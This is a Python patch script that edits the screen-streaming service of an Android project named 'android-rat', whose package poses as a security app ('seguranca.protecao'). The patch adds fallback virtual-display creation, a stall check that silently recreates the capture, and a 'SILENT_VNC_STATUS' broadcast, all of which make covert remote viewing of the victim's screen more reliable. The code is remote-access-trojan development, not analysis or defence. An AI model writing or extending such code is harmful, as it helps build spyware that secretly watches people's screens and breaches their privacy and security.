import shutil
S = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\ScreenStreamService.java"
shutil.copyfile(S, S + ".bak_proj")
s = open(S, encoding="utf-8").read()
assert "reportState" not in s, "ya parcheado"

o = "    private long lastFrameTs = 0L;"
assert s.count(o) == 1
s = s.replace(o, "    private long lastFrameTs = 0L;\n    private volatile long lastFrameMs = 0L;\n    private int densityDpi = 0;")

A = "                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,\n                    reader.getSurface(), null, handler);\n\n            active = true;"
assert s.count(A) == 1
B = "                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,\n                    reader.getSurface(), null, handler);\n            if (vdisplay == null) {\n                Log.w(TAG, \"AUTO_MIRROR falhou, tentando PUBLIC\");\n                vdisplay = projection.createVirtualDisplay(\"KryptosVNC\", outW, outH, dm.densityDpi,\n                        DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,\n                        reader.getSurface(), null, handler);\n            }\n            if (vdisplay == null) {\n                Log.e(TAG, \"createVirtualDisplay retornou null\");\n                reportState(\"FAIL\", \"null\");\n                return;\n            }\n            densityDpi = dm.densityDpi;\n\n            active = true;\n            lastFrameMs = System.currentTimeMillis();\n            reportState(\"OK\", outW + \"x\" + outH);\n            try { handler.removeCallbacks(stallCheck); handler.postDelayed(stallCheck, 5000); } catch (Throwable ignored) {}"
s = s.replace(A, B)

o = "                lastFrameTs = now;"
assert s.count(o) == 1
s = s.replace(o, "                lastFrameTs = now;\n                lastFrameMs = now;")

M = '''    private void reportState(String state, String detail) {
        Log.d(TAG, "PROJ " + state + " " + detail);
        try {
            Intent i = new Intent("com.seguranca.protecao.SILENT_VNC_STATUS");
            i.setPackage(getPackageName());
            i.putExtra("active", active);
            i.putExtra("method", "projection");
            i.putExtra("detail", state + ":" + detail);
            sendBroadcast(i);
        } catch (Throwable ignored) {}
    }

    private final Runnable stallCheck = new Runnable() {
        @Override public void run() {
            try {
                if (active && lastFrameMs > 0 && System.currentTimeMillis() - lastFrameMs > 6000L) {
                    Log.w(TAG, "STALL sem frames -> recriando VirtualDisplay");
                    reportState("STALL", "sem frames");
                    if (vdisplay != null) { try { vdisplay.release(); } catch (Throwable ignored) {} vdisplay = null; }
                    try {
                        if (projection != null && reader != null) {
                            vdisplay = projection.createVirtualDisplay("KryptosVNC", outW, outH, densityDpi,
                                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                                    reader.getSurface(), null, handler);
                        }
                    } catch (Throwable t) { Log.w(TAG, "recriar falhou: " + t); }
                    lastFrameMs = System.currentTimeMillis();
                }
            } catch (Throwable ignored) {}
            try { handler.postDelayed(this, 5000); } catch (Throwable ignored) {}
        }
    };

    private void stopProjection() {'''
o = "    private void stopProjection() {"
assert s.count(o) == 1
s = s.replace(o, M)

open(S, "w", encoding="utf-8").write(s)
print("PASO 2a OK")
